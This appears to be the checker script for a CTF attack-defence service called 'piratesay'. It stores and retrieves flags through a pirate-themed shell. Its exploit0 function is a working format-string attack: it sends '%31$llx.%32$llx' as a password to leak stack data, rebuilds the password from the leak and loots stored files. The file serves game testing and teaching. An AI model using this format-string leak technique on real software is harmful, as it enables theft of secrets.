import asyncio
import random
import re
import string
import time
from asyncio import StreamReader, StreamWriter
from datetime import datetime, timedelta
from logging import LoggerAdapter
from typing import Optional

import faker
from enochecker3 import (AsyncSocket, BaseCheckerTaskMessage, ChainDB,
                         Enochecker, ExploitCheckerTaskMessage, FlagSearcher,
                         GetflagCheckerTaskMessage, GetnoiseCheckerTaskMessage,
                         HavocCheckerTaskMessage, InternalErrorException,
                         MumbleException, OfflineException,
                         PutflagCheckerTaskMessage, PutnoiseCheckerTaskMessage)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 4444
checker = Enochecker("piratesay", SERVICE_PORT)
app = lambda: checker.app


"""
Utility functions
"""

class Connection:
    def __init__(self, socket: AsyncSocket, logger: LoggerAdapter):
        self.reader, self.writer = socket[0], socket[1]
        self.logger = logger
        
    async def create_treasure(self, directory: str, filename: str, password: str, message: str, flag: str, timestamp: str):
        self.logger.debug(
            f"Sending command to create treasure: {filename} in directory {directory} with message: {message}"
        )
        # Go to the directory
        self.writer.write(f"sail {directory}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b"$ ")
        # Create the file
        self.writer.write(f"bury {filename} {flag}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b": ")
        # Write timestamp
        self.writer.write(f"{timestamp}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b": ")
        # Write password
        self.writer.write(f"{password}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b": ")
        # Write message
        self.writer.write(f"{message}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b"$ ")

        if not b"Treasure burried at" in data:
            raise MumbleException("Failed to create file")
    

    async def get_dirs(self):
        # Send the command that lists directories
        self.writer.write(b'scout\n')
        await self.writer.drain()
        
        # Handle the output and wait for the directories listing
        #   Excluding initial '.' and '..' and the last two (empty line and prompt)
        directories = (await self.reader.readuntil(b"$ ")).decode().replace('\r', '').split('\n')[2:-2]
        return directories



@checker.register_dependency
def _get_connection(socket: AsyncSocket, logger: LoggerAdapter) -> Connection:
    return Connection(socket, logger)


"""
CHECKER FUNCTIONS
"""

@checker.putflag(0)
async def putflag_note(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    conn: Connection,
    logger: LoggerAdapter,    
) -> None:
    # Creating a file in the PirateHideout directory and storing the flag in the db

    password: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=16)
    )

    # Log a message before any critical action that could raise an error.
    welcome = await conn.reader.readuntil(b"$ ")

    # Extract name from last line of welcome message
    name = welcome.decode().split("\n")[-1].split(":/")[0]
    # split with _ instead of uppercase
    name = re.sub(r'(?<=[a-z])(?=[A-Z])', '_', name).lower()

    # Get a random time as (YYYY-MM-DD HH:MM)
    # Define the start and end dates
    start_date = datetime(2014, 1, 1)
    end_date = datetime.now()

    # Generate a random time between the start and end dates
    random_time = start_date + timedelta(days=random.randint(0, (end_date - start_date).days),
                                        hours=random.randint(0, 23),
                                        minutes=random.randint(0, 59))
    # convert to string with format YYYY-MM-DD HH:MM
    random_time = random_time.strftime("%Y-%m-%d %H:%M")
    filename = f"{name}_found_shipwreck_{random_time.replace(' ', '_').replace(':', '')}"

    # Get the directories and pick one at random
    directories = await conn.get_dirs()
    directory = random.choice(directories)

    message = f"""Ahoy mateys! I stumbled upon {directory} and 
    discovered a shipwreck full of treasure and rum! I scavanged it all, 
    except for the ship's old flag. It seemed useless, so I'll leave it for 
    whoever comes next. Yo-ho-ho and away we go!"""

    # Await create_treasure
    await conn.create_treasure(directory, filename, password, message, task.flag, random_time)

    # Save as an entry in the db for getflag() to use later.
    await db.set(task.flag, (directory, filename, password, task.flag))

    # Exit
    conn.writer.write(f"dock".encode())
    await conn.writer.drain()

@checker.getflag(0)
async def getflag_note(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection
) -> None:
    
    logger.debug("Getting flag: " + task.flag)
    try:
        directory, filename, password, flag = await db.get(task.flag)
    except KeyError:
        raise MumbleException(f"Missing database entry for {task.flag} from putflag")

    logger.debug(f"File info: {directory}/{filename} with password {password} and flag {flag}")
    await conn.reader.readuntil(b"$ ")

    # Go to the directory
    conn.writer.write(f"sail {directory}\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")

    # Open the file
    conn.writer.write(f"loot {filename}.treasure\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b": ")

    # Enter the password
    conn.writer.write(f"{password}\n".encode())
    await conn.writer.drain()
    data = await conn.reader.readuntil(b"$ ")

    # Check if the flag is in the file
    if not f"{flag}".encode() in data:
            raise MumbleException(f"Couldn't find the flag {flag} in {directory}/{filename}")

    # Exit!
    conn.writer.write(f"dock\n".encode())
    await conn.writer.drain()


# Note: Currently very slow as it doesn't know which file contains the given flag, and will therefore exploit all treasure files
@checker.exploit(0)
async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger: LoggerAdapter) -> Optional[str]:

    await conn.reader.readuntil(b"$ ")
    
    # Get the directories
    directories = await conn.get_dirs()
    logger.debug(f"Directories output: {directories}")

    treasure_dir = {}
    
    # Loop through each directory and scout for .treasure files
    for directory in directories:
        conn.writer.write(f'scout {directory}\n'.encode())
        await conn.writer.drain()
        scout_output = (await conn.reader.readuntil(b"$ ")).decode()

        # Check if there is a .treasure file in the directory
        if '.treasure' in scout_output:
            logger.debug(f".treasure file found in {directory}")
            treasure_dir[directory] = []
            # find the full name of the treasure file and append it to the list
            scout_output = scout_output.replace('\r', '').split('\n')
            for line in (scout_output):
                if '.treasure' in line:
                    treasure_dir[directory].append(line)
    
    # if treasure_dir is still empty, report mumble exception
    if len(treasure_dir) == 0:
        raise MumbleException("No .treasure files found")


    result_text = ""

    
    # For each directory, try to loot the treasure
    for directory in treasure_dir:

        # Change to the directory and loot the treasure
        conn.writer.write(f'sail {directory}\n'.encode())
        await conn.writer.drain()
        await conn.reader.readuntil(b"$ ")

        # For each file in the directory, try to loot it
        for treasure_file in treasure_dir[directory]:

            conn.writer.write(f'loot {treasure_file}\n'.encode())
            await conn.writer.drain()
            
            # Handle the output and wait for the password prompt
            await conn.reader.readuntil(b": ")

            # Send the format string exploit as the password
            conn.writer.write(b'%31$llx.%32$llx\n')
            await conn.writer.drain()

            # Read the buffer to get the incorrect password message
            incorrect_message = (await conn.reader.readuntil(b"$ ")).decode()

            # Extract the two addresses from the incorrect message
            address1_hex, address2_hex = incorrect_message.split(' ')[0].split('.')

            # Convert the addresses to ASCII and reverse them
            address1 = bytes.fromhex(address1_hex).decode()[::-1]
            address2 = bytes.fromhex(address2_hex).decode()[::-1]

            # Print the password
            password = f'{address1}{address2}'
            logger.debug(f'Incorrect message: {incorrect_message}\nAddress 1 Hex: {address1_hex}\nAddress 2 Hex: {address2_hex}\nPassword: {password}')

            # Now try to plunder the file again
            conn.writer.write(f'loot {treasure_file}\n'.encode())
            await conn.writer.drain()
            await conn.reader.readuntil(b": ")

            conn.writer.write(f'{password}\n'.encode())
            await conn.writer.drain()
            
            # Wait for the output and print it
            result = await conn.reader.readuntil(b"$ ")
            logger.debug(result.decode())

            # Check for the flag in the result
            if flag := searcher.search_flag(result):
                return flag
            
            # If the flag was not found, add the result to the result_text
            result_text += result.decode()
        
        # Exit the directory
        conn.writer.write('sail ..\n'.encode())
        await conn.writer.drain()
        await conn.reader.readuntil(b"$ ")

    raise MumbleException("flag not found. Output: " + result_text)


if __name__ == "__main__":
    checker.run()